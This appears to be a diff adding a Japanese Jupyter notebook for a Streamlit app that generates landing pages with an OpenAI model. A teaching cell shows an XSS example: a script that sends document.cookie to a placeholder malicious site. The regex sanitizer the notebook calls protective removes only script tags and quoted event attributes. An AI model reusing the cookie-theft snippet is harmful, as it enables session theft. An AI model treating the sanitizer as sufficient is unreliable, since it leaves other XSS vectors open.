++      "2025-09-15 08:26:18.357 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.357 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.358 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.358 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.359 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.359 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.360 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.360 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.360 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.361 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.363 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.363 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.364 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.368 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.376 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.378 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.378 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.378 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.378 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.379 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.379 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.379 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.379 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.381 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.382 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.382 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.383 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.384 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.389 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.391 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.394 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.396 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.401 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.401 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.401 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.401 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.402 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.402 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.403 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.403 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.403 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.404 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.404 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.405 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.405 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.405 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.405 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.406 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.406 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.406 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.406 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.407 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.407 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.407 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.407 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.408 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.408 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.409 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.410 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.413 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.413 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.414 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.420 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.439 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.447 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.460 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.461 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.461 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.465 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.469 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.473 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.477 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.478 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.478 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.479 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.479 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.482 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.483 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.491 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n"
++     ]
++    }
++   ],
++   "source": [
++    "\n",
++    "# ページ設定（Streamlit アプリ実行時に有効）\n",
++    "st.set_page_config(\n",
++    "    page_title=\"LPジェネレーター（AI + Editor）\",\n",
++    "    page_icon=\"✨\",\n",
++    "    layout=\"wide\",\n",
++    ")\n",
++    "\n",
++    "st.title(\"✨ LPジェネレーター（AI生成 + Editor）\")\n",
++    "st.caption(\"“毎回ちがうUI”をAIが生成 → 右ペインで色/文字/画像を編集 → AI差分編集 → ZIP出力\")\n",
++    "\n",
++    "with st.sidebar:\n",
++    "    st.header(\"基本情報\")\n",
++    "    site_title = st.text_input(\"サイトタイトル / 名前\", \"Yamada Studio\")\n",
++    "    tagline    = st.text_input(\"キャッチコピー\", \"Design that ships.\")\n",
++    "    meta_desc  = st.text_input(\"meta description\", \"小さく速く出して、継続的に磨くためのデザインと実装。\")\n",
++    "    email      = st.text_input(\"連絡先メール\", \"hello@example.com\")\n",
++    "\n",
++    "    st.divider()\n",
++    "    st.header(\"世界観（テーマ）\")\n",
++    "    theme = st.selectbox(\n",
++    "        \"Style Theme（生成AIに渡します）\",\n",
++    "        [\n",
++    "            \"シンプル\",\"ビジネス\",\"可愛い\",\"スタイリッシュ\",\"メルヘン\",\"アメコミ風\",\n",
++    "            \"和風\",\"和モダン\",\"ミニマル\",\"未来的（サイバー風）\",\"レトロポップ\",\n",
++    "            \"エレガント\",\"ナチュラル\",\"ダークモード\",\"雑誌風\",\"クール\",\n",
++    "        ],\n",
++    "        index=0\n",
++    "    )\n",
++    "\n",
++    "    st.divider()\n",
++    "    st.header(\"コンテンツ\")\n",
++    "    about_text   = st.text_area(\"About本文\", height=90, value=\"大阪を拠点に、スピードと品質を両立するデザイン＆実装を提供しています。小さく出して、早く学び、継続的に磨く。\")\n",
++    "    features_csv = st.text_input(\"特徴（カンマ区切り）\", \"高速検証, 明快なUI, スケール設計, 運用しやすい, 品質とスピード, データドリブン\")\n",
++    "    works_csv    = st.text_input(\"実績（カンマ区切り）\", \"SaaSダッシュボード, EC特集, 採用サイト\")\n",
++    "    testi_raw    = st.text_area(\n",
++    "        \"お客様の声（名前|肩書き|コメント を改行）\",\n",
++    "        height=80,\n",
++    "        value=\"佐藤 花子|PM|意思決定が圧倒的に速くなりました。\\n鈴木 次郎|BizDev|初速から質まで、バランスが素晴らしい。\"\n",
++    "    )\n",
++    "\n",
++    "    st.divider()\n",
++    "    st.header(\"AI 生成設定\")\n",
++    "    temperature = st.slider(\"多様性（temperature）\", 0.2, 1.4, 1.0, 0.1)\n"
++   ]
++  },
++  {
++   "cell_type": "markdown",
++   "id": "ed2cfaff",
++   "metadata": {},
++   "source": [
++    "## セクション4：入力データの整形と安全対策（ユーティリティ関数）\n",
++    "\n",
++    "ユーザーがサイドバーで入力した文字列を **アプリ内部で使いやすい形式に整える**\n",
++    "または **不正なコードを取り除いて安全にする** ための補助関数を定義します。\n",
++    "\n",
++    "---\n",
++    "\n",
++    "### 1️⃣ split_csv（カンマ区切り → リスト）\n",
++    "- 役割：カンマで区切られた文字列を、余計な空白を取り除いたリストに変換。\n",
++    "- 例：\n",
++    "\n",
++    "    入力: `\" 高速検証, 明快なUI , , データドリブン \"`\n",
++    "\n",
++    "    出力: `[\"高速検証\", \"明快なUI\", \"データドリブン\"]`\n",
++    "---\n",
++    "\n",
++    "### 2️⃣ parse_testimonials（お客様の声を構造化）\n",
++    "- 役割：「名前｜肩書き｜コメント」の形式で入力された複数行のテキストを、辞書のリスト（List[Dict]）に変換。\n",
++    "- 各行は「|」で分割し、最初の2つを `name` と `role`、残りを `text` としてまとめます。\n",
++    "- 例：\n",
++    "\n",
++    "    入力:\n",
++    "        佐藤 花子|PM|意思決定が速くなりました。\n",
++    "        \n",
++    "    出力:\n",
++    "        [\n",
++    "            {\"name\": \"佐藤 花子\", \"role\": \"PM\", \"text\": \"意思決定が速くなりました。\"},\n",
++    "        ]\n",
++    "---\n",
++    "\n",
++    "### 3️⃣ sanitize_html（危険なHTMLを除去）\n",
++    "- 役割：AI が生成した HTML から、**安全でないコードを削除**。\n",
++    "- 対象:\n",
++    "    - `<script>〜</script>` タグ\n",
++    "    - `onClick` など「on」で始まるイベント属性\n",
++    "- これにより、予期せぬ JavaScript 実行を防ぎます（XSS 対策）。\n",
++    "\n",
++    "#### なぜ危険なのか（XSSの例）\n",
++    "Webページの中で JavaScript はとても強力です。  \n",
++    "でも「他人が書いたコード」をそのままブラウザに表示すると、悪意のあるスクリプトが動いてしまう危険があります。  \n",
++    "これを **XSS（クロスサイトスクリプティング）** といいます。\n",
++    "\n",
++    "例：AI が生成した HTML の中にこんなコードがあった場合。\n",
++    "\n",
++    "    <script>\n",
++    "        alert(\"あなたのクッキーを送信します\");\n",
++    "        fetch(\"http://悪意のあるサイト/?cookie=\" + document.cookie);\n",
++    "    </script>\n",
++    "\n",
++    "ページを開いた人のブラウザで、勝手にスクリプトが動き、**ログイン情報や個人情報を盗まれる** 危険があります。\n",
++    "\n",
++    "#### sanitize_html がやっていること\n",
++    "    html = re.sub(r\"(?is)<script.*?>.*?</script>\", \"\", html)\n",
++    "    html = re.sub(r'(?is)\\son\\w+\\s*=\\s*([\"\\']).*?\\1', \"\", html)\n",
++    "\n",
++    "- 1 行目：`<script>〜</script>` タグを見つけて丸ごと削除\n",
++    "- 2 行目：`onClick` など「on」で始まるイベント属性を削除\n",
++    "\n",
++    "これにより、ページを読み込んだだけでスクリプトが動くのを防ぎます。\n",
++    "\n",
++    "#### 💡 まとめ\n",
++    "sanitize_html は **「AI が出力した HTML をそのまま信じない」** ための安全弁。\n",
++    "XSS（悪意あるスクリプトの実行）を防ぎ、ユーザーやアプリを守ります。\n",
++    "\n",
++    "---\n",
++    "\n",
++    "### 🔎 ポイントまとめ\n",
++    "\n",
++    "| 関数名 | 主な用途 |\n",
++    "|---|---|\n",
++    "| split_csv | カンマ区切りのテキストをリストに変換 |\n",
++    "| parse_testimonials | 「名前｜肩書き｜コメント」形式のテキストを辞書リストに整形 |\n",
++    "| sanitize_html | HTMLから`<script>`タグや`onClick`属性を削除して安全性を確保 |\n",
++    "\n",
++    "これらは「メイン処理の前にデータを整える」ための **下準備**。\n",
++    "\n"
++   ]
++  },
++  {
++   "cell_type": "code",
++   "execution_count": 17,
++   "id": "78a46432",
++   "metadata": {},
++   "outputs": [],
++   "source": [
++    "\n",
++    "def split_csv(s: str) -> List[str]:\n",
++    "    return [x.strip() for x in s.split(\",\") if x.strip()]\n",
++    "\n",
++    "def parse_testimonials(s: str) -> List[Dict[str, str]]:\n",
++    "    rows: List[Dict[str, str]] = []\n",
++    "    for line in s.splitlines():\n",
++    "        p = [u.strip() for u in line.split(\"|\")]\n",
++    "        if len(p) >= 3:\n",
++    "            rows.append({\"name\": p[0], \"role\": p[1], \"text\": \"|\".join(p[2:])})\n",
++    "    return rows\n",
++    "\n",
++    "def sanitize_html(html: str) -> str:\n",
++    "    # <script> と on* ハンドラを除去して安全側に寄せる\n",
++    "    html = re.sub(r\"(?is)<script.*?>.*?</script>\", \"\", html)\n",
++    "    html = re.sub(r'(?is)\\son\\w+\\s*=\\s*([\"\\']).*?\\1', \"\", html)  # onClick 等\n",
++    "    return html\n"
++   ]
++  },
++  {
++   "cell_type": "markdown",
++   "id": "57878385",
++   "metadata": {},
++   "source": [
++    "\n",
++    "## セクション5：生成プロンプト & OpenAI 呼び出し\n",
++    "\n",
++    "- **JSONスキーマ**を固定して、出力を構造化\n",
++    "- 例外（`RateLimitError`, `APIStatusError` など）をキャッチしてユーザーに説明\n"
++   ]
++  },
++  {
++   "cell_type": "code",
++   "execution_count": 18,
++   "id": "7c322179",
++   "metadata": {},
++   "outputs": [],
++   "source": [
++    "\n",
++    "def build_generate_prompt(theme: str, site_title: str, tagline: str, meta_desc: str,\n",
++    "                          email: str, about: str, feats: list, works: list, testi: list, seed: int) -> str:\n",
++    "    return f\"\"\"\n",
++    "あなたはLPデザイナー兼フロントエンドです。以下の要件で “完成HTML/CSS” をゼロから生成してください。\n",
++    "\n",
++    "# ゴール\n",
++    "- 「{theme}」の世界観で、**初見で違いが分かる**LPを作る\n",
++    "- **HTMLの構造**・**装飾**・**タイポ**・**余白**・**モーション**まで変える\n",
++    "- 外部CDN/JSは使わない（純HTML+CSS）。画像はダミー矩形でOK。\n",
++    "\n",
++    "# 入力データ\n",
++    "- title: {site_title}\n",
++    "- tagline: {tagline}\n",
++    "- meta_description: {meta_desc}\n",
++    "- email: {email}\n",
++    "- about: {about}\n",
++    "- features: {feats}\n",
++    "- works: {works}\n",
++    "- testimonials: {testi}\n",
++    "- style_seed: {seed}\n",
++    "\n",
++    "# 厳格仕様\n",
++    "- 出力は JSON 1個のみ。スキーマ:\n",
++    "  {{\n",
++    "    \"title\": \"string\",\n",
++    "    \"meta\": {{\"description\":\"string\"}},\n",
++    "    \"css\": \"string\",             // <style>なし、純CSSのみ\n",
++    "    \"body_html\": \"string\"        // <body>内のみ。<html>/<head>不要\n",
++    "  }}\n",
++    "\n",
++    "# デザイン指針\n",
++    "- 同じ {theme} でも毎回**配置・形・装飾**が異なること\n",
++    "- セクション数/順序/グリッド/装飾（波形/ステッカー/枠/グロー等）を**毎回変える**\n",
++    "- :root で色/角丸/影/線/背景などのトークンを定義\n",
++    "- 画像は <div aria-label=\"image\" class=\"img img--X\"> のようなダミー\n",
++    "- mailto: のCTAを1つ以上\n",
++    "\n",
++    "# 禁止\n",
++    "- <script>、外部URL、@import、実ファイル画像の読み込み\n",
++    "\"\"\"\n",
++    "\n",
++    "def ai_generate(theme: str, site_title: str, tagline: str, meta_desc: str, email: str,\n",
++    "                about: str, feats: list, works: list, testi: list, temperature: float) -> Tuple[str, str]:\n",
++    "    if client is None:\n",
++    "        raise RuntimeError(\"OpenAI クライアントが初期化されていません。APIキー設定を確認してください。\")\n",
++    "    seed = random.randint(1, 10_000_000)\n",
++    "    prompt = build_generate_prompt(theme, site_title, tagline, meta_desc, email, about, feats, works, testi, seed)\n",
++    "    resp = client.chat.completions.create(\n",
++    "        model=\"gpt-4o-mini\",\n",
++    "        temperature=temperature,\n",
++    "        response_format={\"type\": \"json_object\"},\n",
++    "        messages=[{\"role\": \"user\", \"content\": prompt}],\n",
++    "    )\n",
++    "    data = json.loads(resp.choices[0].message.content)\n",
++    "    css  = data[\"css\"]\n",
++    "    body = sanitize_html(data[\"body_html\"])\n",
++    "    return css, body\n"
++   ]
++  },
++  {
++   "cell_type": "markdown",
++   "id": "65136335",
++   "metadata": {},
++   "source": [
++    "\n",
++    "## セクション6：CSS変数・画像・テキストの編集ツール\n",
++    "このパートでは、AI が生成した **CSS / HTML を後から編集できるようにするツール関数** をまとめています。\n",
++    "色・角丸などのテーマ設定、ダミー画像の差し替え、テキストの修正を行うための仕組みです。\n",
++    "\n",
++    "---\n",
++    "\n",
++    "### 1️⃣ CSS の `:root` 変数を扱う\n",
++    "\n",
++    "- `:root` は **HTML 全体（<html>）を指す CSS のセレクタ**。\n",
++    "- ここにカスタムプロパティ（CSS変数）をまとめると、色や余白などを一括管理できます。\n",
++    "\n",
++    "このコードでは正規表現 `VAR_RE` を使って、`:root { ... }` の中にある変数を探しています。\n",
++    "\n",
++    "- `extract_root_vars(css)` : `:root` の中から `--main-color` などの変数名と値を辞書に抽出\n",
++    "- `replace_root_vars(css, new_vars)` : 抽出した変数を新しい値に置き換え、テーマカラーや角丸を更新\n",
++    "\n",
++    "> `VAR_RE` は **Variables + Regular Expression** の略。\n",
++    "\n",
++    "---\n",
++    "\n",
++    "### 2️⃣ 画像プレースホルダの差し替え\n",
++    "\n",
++    "AI が生成する HTML では、画像が `<div aria-label=\"image\">` のような **ダミー要素** で出てきます。\n",
++    "\n",
++    "- `find_image_placeholders(html)` : HTML 内からダミー画像を探す  \n",
++    "- `data_uri_from_file(file)` : アップロード画像を Base64（data URI）形式に変換  \n",
++    "- `replace_placeholder_with_img(html, placeholder, data_uri)` : ダミー `<div>` を `<img>` タグに置換\n",
++    "\n",
++    "> `IMG_PLACEHOLDER_RE` は **Image Placeholder + Regular Expression** の略。\n",
++    "\n",
++    "---\n",
++    "\n",
++    "### 3️⃣ 見出しやサブテキストを編集\n",
++    "\n",
++    "ページのタイトルやキャッチコピーを後から変更できるようにしています。\n",
++    "\n",
++    "- `extract_first_h1(html)` / `replace_first_h1(html, new_text)`  \n",
++    "  → 最初の `<h1>` の文字を取得 / 書き換え  \n",
++    "- `extract_subtext(html)` / `replace_subtext(html, new_text)`  \n",
++    "  → `class=\"sub\"` または `class=\"lead\"` の要素を取得 / 書き換え\n",
++    "\n",
++    "---\n",
++    "\n",
++    "### 4️⃣ 正規表現について\n",
++    "\n",
++    "`VAR_RE` や `IMG_PLACEHOLDER_RE` は「正規表現（Regular Expression）」で書かれています。\n",
++    "これは { と } に囲まれている中身を取り出すために作っています。\n",
++    "\n",
++    "- 例：`\\s*\\{([^}]*)\\}`  \n",
++    "  - `\\s*` → 空白を0個以上  \n",
++    "  - `\\{` → `{` を探す  \n",
++    "  - `([^}]*)` → `}` 以外の文字を全部まとめて取り出す  \n",
++    "  - `\\}` → `}` を探す\n",
++    "\n",
++    "---\n",
++    "\n",
++    "### 💡 まとめ\n",
++    "\n",
++    "| 分類 | 関数 | 主な役割 |\n",
++    "|---|---|---|\n",
++    "| **CSS** | `extract_root_vars` / `replace_root_vars` | `:root` の CSS変数を抽出・更新 |\n",
++    "| **画像** | `find_image_placeholders` / `data_uri_from_file` / `replace_placeholder_with_img` | ダミー画像を実画像に差し替え |\n",
++    "| **テキスト** | `extract_first_h1` / `replace_first_h1` / `extract_subtext` / `replace_subtext` | 見出しやサブコピーを取得・編集 |\n",
++    "\n",
++    "> これらのユーティリティ関数は、**AI が作ったデザインを「そのまま表示」ではなく「自由に調整」できるようにするための設計**です。\n",
++    "\n"
++   ]
++  },
++  {
++   "cell_type": "code",
++   "execution_count": 19,
++   "id": "a03a32f0",
++   "metadata": {},
++   "outputs": [],
++   "source": [
++    "\n",
++    "VAR_RE = re.compile(r\":root\\s*\\{([^}]*)\\}\", re.S)\n",
++    "IMG_PLACEHOLDER_RE = re.compile(\n",
++    "    r'(<div[^>]*?(aria-label\\s*=\\s*\"image\"[^>]*|class\\s*=\\s*\"[^\"]*img[^\"]*\"[^>]*)>)(.*?)</div>',\n",
++    "    re.I | re.S\n",
++    ")\n",
++    "\n",
++    "def extract_root_vars(css_text: str) -> Dict[str, str]:\n",
++    "    m = VAR_RE.search(css_text)\n",
++    "    if not m: return {}\n",
++    "    vars_: Dict[str, str] = {}\n",
++    "    for line in m.group(1).split(\";\"):\n",
++    "        if \":\" in line:\n",
++    "            k, v = line.split(\":\", 1)\n",
++    "            if k.strip().startswith(\"--\") and v.strip():\n",
++    "                vars_[k.strip()] = v.strip()\n",
++    "    return vars_\n",
++    "\n",
++    "def replace_root_vars(css_text: str, new_vars: Dict[str, str]) -> str:\n",
++    "    def repl(match: re.Match) -> str:\n",
++    "        block = match.group(1)\n",
++    "        pairs, seen = [], set()\n",
++    "        for ln in block.split(\";\"):\n",
++    "            if \":\" in ln:\n",
++    "                k, v = ln.split(\":\", 1)\n",
++    "                key = k.strip()\n",
++    "                if key in new_vars:\n",
++    "                    pairs.append(f\"{key}: {new_vars[key]}\"); seen.add(key)\n",
++    "                else:\n",
++    "                    pairs.append(f\"{key}:{v}\")\n",
++    "        for k, v in new_vars.items():\n",
++    "            if k not in seen: pairs.append(f\"{k}: {v}\")\n",
++    "        return \":root{\" + \";\".join(pairs) + \"}\"\n",
++    "\n",
++    "    if not VAR_RE.search(css_text):\n",
++    "        head = \":root{\" + \";\".join([f\"{k}:{v}\" for k, v in new_vars.items()]) + \"}\"\n",
++    "        return head + css_text\n",
++    "    return VAR_RE.sub(repl, css_text, count=1)\n",
++    "\n",
++    "def find_image_placeholders(html: str) -> List[Tuple[int, str]]:\n",
++    "    return [(m.start(), m.group(0)) for m in IMG_PLACEHOLDER_RE.finditer(html)]\n",
++    "\n",
++    "def data_uri_from_file(file) -> Tuple[str, str]:\n",
++    "    data = file.read()\n",
++    "    mime = file.type or \"application/octet-stream\"\n",
++    "    ext = \"png\"\n",
++    "    if \"jpeg\" in mime: ext = \"jpg\"\n",
++    "    elif \"webp\" in mime: ext = \"webp\"\n",
++    "    b64 = base64.b64encode(data).decode(\"ascii\")\n",
++    "    return f\"data:{mime};base64,{b64}\", ext\n",
++    "\n",
++    "def replace_placeholder_with_img(html: str, placeholder_html: str, data_uri: str) -> str:\n",
++    "    cls = \"\"\n",
++    "    m = re.search(r'class\\s*=\\s*\"([^\"]+)\"', placeholder_html, re.I)\n",
++    "    if m: cls = m.group(1)\n",
++    "    alt = \"image\"\n",
++    "    m2 = re.search(r'aria-label\\s*=\\s*\"([^\"]+)\"', placeholder_html, re.I)\n",
++    "    if m2: alt = m2.group(1)\n",
++    "    img = f'<img src=\"{data_uri}\" alt=\"{alt}\" class=\"{cls}\"/>'\n",
++    "    return html.replace(placeholder_html, img, 1)\n",
++    "\n",
++    "def extract_first_h1(html: str) -> str:\n",
++    "    m = re.search(r\"<h1[^>]*>(.*?)</h1>\", html, re.S | re.I)\n",
++    "    return (m.group(1).strip() if m else \"\")\n",
++    "\n",
++    "def replace_first_h1(html: str, new_text: str) -> str:\n",
++    "    return re.sub(r\"(<h1[^>]*>)(.*?)(</h1>)\", r\"\\1\" + re.escape(new_text) + r\"\\3\",\n",
++    "                  html, count=1, flags=re.S | re.I)\n",
++    "\n",
++    "def extract_subtext(html: str) -> str:\n",
++    "    m = re.search(r\"<(p|div)\\s+class=['\\\"](sub|lead)['\\\"][^>]*>(.*?)</\\1>\", html, re.S | re.I)\n",
++    "    return (m.group(3).strip() if m else \"\")\n",
++    "\n",
++    "def replace_subtext(html: str, new_text: str) -> str:\n",
++    "    return re.sub(r\"(<(p|div)\\s+class=['\\\"](sub|lead)['\\\"][^>]*>)(.*?)(</\\2>)\",\n",
++    "                  r\"\\1\" + re.escape(new_text) + r\"\\5\",\n",
++    "                  html, count=1, flags=re.S | re.I)\n"
++   ]
++  },
++  {
++   "cell_type": "markdown",
++   "id": "6dbff4f2",
++   "metadata": {},
++   "source": [
++    "## セクション7：生成ボタン & セッション状態\n",
++    "\n",
++    "- `st.session_state` に生成後の HTML / CSS / 画像スロットを保持  \n",
++    "- 「LPを生成」ボタンを押すと `ai_generate()` が呼ばれ、CSS と HTML を生成  \n",
++    "- 成功時は完成版の `index.html` を組み立てて `session_state` に保存  \n",
++    "- 再実行（Streamlit の**毎フレーム実行**）でも結果を維持できるように設計\n"
++   ]
++  },
++  {
++   "cell_type": "code",
++   "execution_count": 20,
++   "id": "9e8733d3",
++   "metadata": {},
++   "outputs": [
++    {
++     "name": "stderr",
++     "output_type": "stream",
++     "text": [
++      "2025-09-15 11:13:48.360 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 11:13:48.368 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 11:13:48.369 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 11:13:48.374 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 11:13:48.400 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 11:13:48.419 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 11:13:48.472 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 11:13:48.495 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 11:13:48.503 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n"
++     ]
++    }
++   ],
++   "source": [
++    "\n",
++    "if \"gen_html\" not in st.session_state: st.session_state.gen_html = \"\"\n",
++    "if \"gen_css\"  not in st.session_state: st.session_state.gen_css  = \"\"\n",
++    "if \"img_slots\" not in st.session_state: st.session_state.img_slots = []\n",
++    "\n",
++    "gen_clicked = st.button(\"🎯 LPを生成（AI）\", type=\"primary\")\n",
++    "\n",
++    "if gen_clicked:\n",
++    "    try:\n",
++    "        css, body = ai_generate(\n",
++    "            theme, site_title, tagline, meta_desc, email,\n",
++    "            about_text, split_csv(features_csv), split_csv(works_csv), parse_testimonials(testi_raw),\n",
++    "            temperature\n",
++    "        )\n",
